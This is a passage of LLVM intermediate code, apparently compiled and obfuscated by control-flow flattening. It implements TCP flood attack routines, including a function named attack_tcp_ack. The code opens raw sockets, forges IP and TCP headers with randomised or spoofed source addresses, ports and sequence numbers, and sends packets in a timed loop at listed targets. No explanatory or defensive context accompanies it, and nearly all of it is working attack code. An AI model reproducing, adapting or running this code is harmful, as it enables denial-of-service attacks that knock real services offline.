  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 3
  store i32 %403, i32* %405, align 4
  store i32 -1063018926, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  %407 = load i8, i8* %22, align 1
  %408 = icmp ne i8 %407, 0
  %409 = select i1 %408, i32 -1443419673, i32 -1820443552
  store i32 %409, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  %411 = call i32 @rand_next()
  %412 = and i32 %411, 65535
  %413 = trunc i32 %412 to i16
  %414 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  store i32 -1820443552, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  %417 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %418 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %417, i32 0, i32 7
  store i16 0, i16* %418, align 2
  %419 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %420 = bitcast %struct.iphdr* %419 to i16*
  %421 = call zeroext i16 @checksum_generic(i16* %420, i32 20)
  %422 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %423 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %422, i32 0, i32 7
  store i16 %421, i16* %423, align 2
  %424 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 6
  store i16 0, i16* %425, align 4
  %426 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %427 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %428 = bitcast %struct.tcphdr* %427 to i8*
  %429 = call zeroext i16 @htons(i16 zeroext 40) #7
  %430 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %426, i8* %428, i16 zeroext %429, i32 40)
  %431 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %432 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %431, i32 0, i32 6
  store i16 %430, i16* %432, align 4
  %433 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %434 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %433, i32 0, i32 1
  %435 = load i16, i16* %434, align 2
  %436 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %437 = load i32, i32* %11, align 4
  %438 = sext i32 %437 to i64
  %439 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %436, i64 %438
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %439, i32 0, i32 0
  %441 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %440, i32 0, i32 1
  store i16 %435, i16* %441, align 2
  %442 = load i32, i32* %12, align 4
  %443 = load i8*, i8** %33, align 8
  %444 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %445 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %446 = load i32, i32* %11, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %448, i32 0, i32 0
  %450 = bitcast %struct.sockaddr_in* %449 to %struct.sockaddr*
  store %struct.sockaddr* %450, %struct.sockaddr** %444, align 8
  %451 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %452 = load %struct.sockaddr*, %struct.sockaddr** %451, align 8
  %453 = call i64 @sendto(i32 %442, i8* %443, i64 60, i32 16384, %struct.sockaddr* %452, i32 16)
  store i32 252429917, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = load i32, i32* %11, align 4
  %456 = add nsw i32 %455, 1
  store i32 %456, i32* %11, align 4
  store i32 -1817216137, i32* %switchVar
  br label %loopEnd

; <label>:457:                                    ; preds = %loopEntry
  %458 = call i64 @time(i64* null) #6
  %459 = load i32, i32* %29, align 4
  %460 = sext i32 %459 to i64
  %461 = icmp sgt i64 %458, %460
  %462 = select i1 %461, i32 674372863, i32 -1152547667
  store i32 %462, i32* %switchVar
  br label %loopEnd

; <label>:463:                                    ; preds = %loopEntry
  store i32 -1960548928, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  store i32 1494935138, i32* %switchVar
  br label %loopEnd

; <label>:465:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %464, %463, %457, %454, %416, %410, %406, %402, %398, %394, %390, %384, %379, %373, %368, %362, %357, %353, %349, %328, %308, %302, %301, %300, %297, %172, %168, %124, %118, %117, %114, %108, %107, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i8, align 1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.tcphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %40 = load i8, i8* %7, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias i8* @calloc(i64 %41, i64 8) #6
  %43 = bitcast i8* %42 to i8**
  store i8** %43, i8*** %13, align 8
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 2, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %14, align 1
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 3, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %15, align 2
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 4, i32 64)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %16, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 5, i32 0)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %17, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 6, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %18, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 7, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %19, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 16, i32 65535)
  store i32 %70, i32* %20, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 17, i32 65535)
  store i32 %73, i32* %21, align 4
  %74 = load i8, i8* %9, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 10, i32 0)
  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %22, align 1
  %78 = load i8, i8* %9, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 11, i32 1)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %23, align 1
  %82 = load i8, i8* %9, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 12, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %24, align 1
  %86 = load i8, i8* %9, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 13, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %25, align 1
  %90 = load i8, i8* %9, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 14, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %26, align 1
  %94 = load i8, i8* %9, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %96 = call i32 @attack_get_opt_int(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 15, i32 0)
  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %27, align 1
  %98 = load i8, i8* %9, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 0, i32 512)
  store i32 %100, i32* %28, align 4
  %101 = load i8, i8* %9, align 1
  %102 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %103 = call i32 @attack_get_opt_int(i8 zeroext %101, %struct.attack_option* %102, i8 zeroext 1, i32 1)
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* %29, align 1
  %105 = load i8, i8* %9, align 1
  %106 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %107 = load i32, i32* @LOCAL_ADDR, align 4
  %108 = call i32 @attack_get_opt_ip(i8 zeroext %105, %struct.attack_option* %106, i8 zeroext 24, i32 %107)
  store i32 %108, i32* %30, align 4
  %109 = call i64 @time(i64* null) #6
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = add nsw i64 %109, %111
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %31, align 4
  %114 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %114, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %12, align 4
  %switchVar = alloca i32
  store i32 -144682045, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -144682045, label %first
    i32 -286605045, label %117
    i32 -73023543, label %118
    i32 -1201493236, label %124
    i32 -267337498, label %127
    i32 -713642698, label %128
    i32 -19129271, label %134
    i32 1473686120, label %182
    i32 -1659142680, label %186
    i32 -1120590318, label %281
    i32 863789682, label %287
    i32 -666900215, label %294
    i32 1777236028, label %297
    i32 -1811546734, label %298
    i32 -816605449, label %299
    i32 332375848, label %305
    i32 -1531334062, label %328
    i32 -1883179622, label %349
    i32 853218694, label %353
    i32 -1965291146, label %357
    i32 -506736946, label %362
    i32 33947418, label %368
    i32 504820071, label %373
    i32 1005930174, label %379
    i32 -1170789176, label %384
    i32 -513452007, label %390
    i32 -976560986, label %394
    i32 -1417165391, label %398
    i32 803832444, label %402
    i32 922779263, label %406
    i32 1754715335, label %410
    i32 1724938875, label %417
    i32 969309119, label %466
    i32 -440736503, label %469
    i32 1190730789, label %475
    i32 127843219, label %476
    i32 -617781871, label %477
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %115 = icmp eq i32 %.reload, -1
  %116 = select i1 %115, i32 -286605045, i32 -73023543
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  store i32 -617781871, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %119 = load i32, i32* %12, align 4
  %120 = bitcast i32* %11 to i8*
  %121 = call i32 @setsockopt(i32 %119, i32 0, i32 3, i8* %120, i32 4) #6
  %122 = icmp eq i32 %121, -1
  %123 = select i1 %122, i32 -1201493236, i32 -267337498
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i32, i32* %12, align 4
  %126 = call i32 @close(i32 %125)
  store i32 -617781871, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -713642698, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %11, align 4
  %130 = load i8, i8* %7, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %129, %131
  %133 = select i1 %132, i32 -19129271, i32 1777236028
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %136 = load i8**, i8*** %13, align 8
  %137 = load i32, i32* %11, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8*, i8** %136, i64 %138
  store i8* %135, i8** %139, align 8
  %140 = load i8**, i8*** %13, align 8
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i8*, i8** %140, i64 %142
  %144 = load i8*, i8** %143, align 8
  %145 = bitcast i8* %144 to %struct.iphdr*
  store %struct.iphdr* %145, %struct.iphdr** %32, align 8
  %146 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %147 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %146, i64 1
  %148 = bitcast %struct.iphdr* %147 to %struct.tcphdr*
  store %struct.tcphdr* %148, %struct.tcphdr** %33, align 8
  %149 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i64 1
  %151 = bitcast %struct.tcphdr* %150 to i8*
  store i8* %151, i8** %34, align 8
  %152 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = load i8, i8* %153, align 4
  %155 = and i8 %154, 15
  %156 = or i8 %155, 64
  store i8 %156, i8* %153, align 4
  %157 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %158 = bitcast %struct.iphdr* %157 to i8*
  %159 = load i8, i8* %158, align 4
  %160 = and i8 %159, -16
  %161 = or i8 %160, 5
  store i8 %161, i8* %158, align 4
  %162 = load i8, i8* %14, align 1
  %163 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 1
  store i8 %162, i8* %164, align 1
  %165 = load i32, i32* %28, align 4
  %166 = sext i32 %165 to i64
  %167 = add i64 40, %166
  %168 = trunc i64 %167 to i16
  %169 = call zeroext i16 @htons(i16 zeroext %168) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 2
  store i16 %169, i16* %171, align 2
  %172 = load i16, i16* %15, align 2
  %173 = call zeroext i16 @htons(i16 zeroext %172) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 3
  store i16 %173, i16* %175, align 4
  %176 = load i8, i8* %16, align 1
  %177 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 5
  store i8 %176, i8* %178, align 4
  %179 = load i8, i8* %17, align 1
  %180 = icmp ne i8 %179, 0
  %181 = select i1 %180, i32 1473686120, i32 -1659142680
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %184 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 4
  store i16 %183, i16* %185, align 2
  store i32 -1659142680, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 6
  store i8 6, i8* %188, align 1
  %189 = load i32, i32* %30, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 8
  store i32 %189, i32* %191, align 4
  %192 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %193 = load i32, i32* %11, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i64 %194
  %196 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %195, i32 0, i32 1
  %197 = load i32, i32* %196, align 4
  %198 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 9
  store i32 %197, i32* %199, align 4
  %200 = load i16, i16* %18, align 2
  %201 = call zeroext i16 @htons(i16 zeroext %200) #7
  %202 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 0
  store i16 %201, i16* %203, align 4
  %204 = load i16, i16* %19, align 2
  %205 = call zeroext i16 @htons(i16 zeroext %204) #7
  %206 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 1
  store i16 %205, i16* %207, align 2
  %208 = load i32, i32* %20, align 4
  %209 = trunc i32 %208 to i16
  %210 = call zeroext i16 @htons(i16 zeroext %209) #7
  %211 = zext i16 %210 to i32
  %212 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 2
  store i32 %211, i32* %213, align 4
  %214 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 4
  %216 = load i16, i16* %215, align 4
  %217 = and i16 %216, -241
  %218 = or i16 %217, 80
  store i16 %218, i16* %215, align 4
  %219 = load i8, i8* %22, align 1
  %220 = sext i8 %219 to i16
  %221 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %222 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %221, i32 0, i32 4
  %223 = load i16, i16* %222, align 4
  %224 = and i16 %220, 1
  %225 = shl i16 %224, 13
  %226 = and i16 %223, -8193
  %227 = or i16 %226, %225
  store i16 %227, i16* %222, align 4
  %228 = load i8, i8* %23, align 1
  %229 = sext i8 %228 to i16
  %230 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 4
  %232 = load i16, i16* %231, align 4
  %233 = and i16 %229, 1
  %234 = shl i16 %233, 12
  %235 = and i16 %232, -4097
  %236 = or i16 %235, %234
  store i16 %236, i16* %231, align 4
  %237 = load i8, i8* %24, align 1
  %238 = sext i8 %237 to i16
  %239 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 4
  %241 = load i16, i16* %240, align 4
  %242 = and i16 %238, 1
  %243 = shl i16 %242, 11
  %244 = and i16 %241, -2049
  %245 = or i16 %244, %243
  store i16 %245, i16* %240, align 4
  %246 = load i8, i8* %25, align 1
  %247 = sext i8 %246 to i16
  %248 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 4
  %250 = load i16, i16* %249, align 4
  %251 = and i16 %247, 1
  %252 = shl i16 %251, 10
  %253 = and i16 %250, -1025
  %254 = or i16 %253, %252
  store i16 %254, i16* %249, align 4
  %255 = load i8, i8* %26, align 1
  %256 = sext i8 %255 to i16
  %257 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %258 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %257, i32 0, i32 4
  %259 = load i16, i16* %258, align 4
  %260 = and i16 %256, 1
  %261 = shl i16 %260, 9
  %262 = and i16 %259, -513
  %263 = or i16 %262, %261
  store i16 %263, i16* %258, align 4
  %264 = load i8, i8* %27, align 1
  %265 = sext i8 %264 to i16
  %266 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 4
  %268 = load i16, i16* %267, align 4
  %269 = and i16 %265, 1
  %270 = shl i16 %269, 8
  %271 = and i16 %268, -257
  %272 = or i16 %271, %270
  store i16 %272, i16* %267, align 4
  %273 = call i32 @rand_next()
  %274 = and i32 %273, 65535
  %275 = trunc i32 %274 to i16
  %276 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %277 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %276, i32 0, i32 5
  store i16 %275, i16* %277, align 2
  %278 = load i8, i8* %24, align 1
  %279 = icmp ne i8 %278, 0
  %280 = select i1 %279, i32 -1120590318, i32 863789682
  store i32 %280, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 4
  %284 = load i16, i16* %283, align 4
  %285 = and i16 %284, -2049
  %286 = or i16 %285, 2048
  store i16 %286, i16* %283, align 4
  store i32 863789682, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8*, i8** %34, align 8
  %289 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %288, i32 %289)
  %290 = load i8*, i8** %34, align 8
  %291 = load i32, i32* %28, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds i8, i8* %290, i64 %292
  store i8 0, i8* %293, align 1
  store i32 -666900215, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %11, align 4
  %296 = add nsw i32 %295, 1
  store i32 %296, i32* %11, align 4
  store i32 -713642698, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  store i32 -1811546734, i32* %switchVar
  br label %loopEnd

; <label>:298:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -816605449, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i32, i32* %11, align 4
  %301 = load i8, i8* %7, align 1
  %302 = zext i8 %301 to i32
  %303 = icmp slt i32 %300, %302
  %304 = select i1 %303, i32 332375848, i32 -440736503
  store i32 %304, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i8**, i8*** %13, align 8
  %307 = load i32, i32* %11, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds i8*, i8** %306, i64 %308
  %310 = load i8*, i8** %309, align 8
  store i8* %310, i8** %35, align 8
  %311 = load i8*, i8** %35, align 8
  %312 = bitcast i8* %311 to %struct.iphdr*
  store %struct.iphdr* %312, %struct.iphdr** %36, align 8
  %313 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i64 1
  %315 = bitcast %struct.iphdr* %314 to %struct.tcphdr*
  store %struct.tcphdr* %315, %struct.tcphdr** %37, align 8
  %316 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i64 1
  %318 = bitcast %struct.tcphdr* %317 to i8*
  store i8* %318, i8** %38, align 8
  %319 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %320 = load i32, i32* %11, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %319, i64 %321
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i32 0, i32 2
  %324 = load i8, i8* %323, align 4
  %325 = zext i8 %324 to i32
  %326 = icmp slt i32 %325, 32
  %327 = select i1 %326, i32 -1531334062, i32 -1883179622
  store i32 %327, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  %329 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %330 = load i32, i32* %11, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 1
  %334 = load i32, i32* %333, align 4
  %335 = call i32 @ntohl(i32 %334) #7
  %336 = call i32 @rand_next()
  %337 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %338 = load i32, i32* %11, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %337, i64 %339
  %341 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %340, i32 0, i32 2
  %342 = load i8, i8* %341, align 4
  %343 = zext i8 %342 to i32
  %344 = lshr i32 %336, %343
  %345 = add i32 %335, %344
  %346 = call i32 @htonl(i32 %345) #7
  %347 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 9
  store i32 %346, i32* %348, align 4
  store i32 -1883179622, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i32, i32* %30, align 4
  %351 = icmp eq i32 %350, -1
  %352 = select i1 %351, i32 853218694, i32 -1965291146
  store i32 %352, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = call i32 @rand_next()
  %355 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 8
  store i32 %354, i32* %356, align 4
  store i32 -1965291146, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i16, i16* %15, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 65535
  %361 = select i1 %360, i32 -506736946, i32 33947418
  store i32 %361, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  %363 = call i32 @rand_next()
  %364 = and i32 %363, 65535
  %365 = trunc i32 %364 to i16
  %366 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i32 0, i32 3
  store i16 %365, i16* %367, align 4
  store i32 33947418, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  %369 = load i16, i16* %18, align 2
  %370 = zext i16 %369 to i32
  %371 = icmp eq i32 %370, 65535
  %372 = select i1 %371, i32 504820071, i32 1005930174
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = call i32 @rand_next()
  %375 = and i32 %374, 65535
  %376 = trunc i32 %375 to i16
  %377 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 0
  store i16 %376, i16* %378, align 4
  store i32 1005930174, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load i16, i16* %19, align 2
  %381 = zext i16 %380 to i32
  %382 = icmp eq i32 %381, 65535
  %383 = select i1 %382, i32 -1170789176, i32 -513452007
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = call i32 @rand_next()
  %386 = and i32 %385, 65535
  %387 = trunc i32 %386 to i16
  %388 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 1
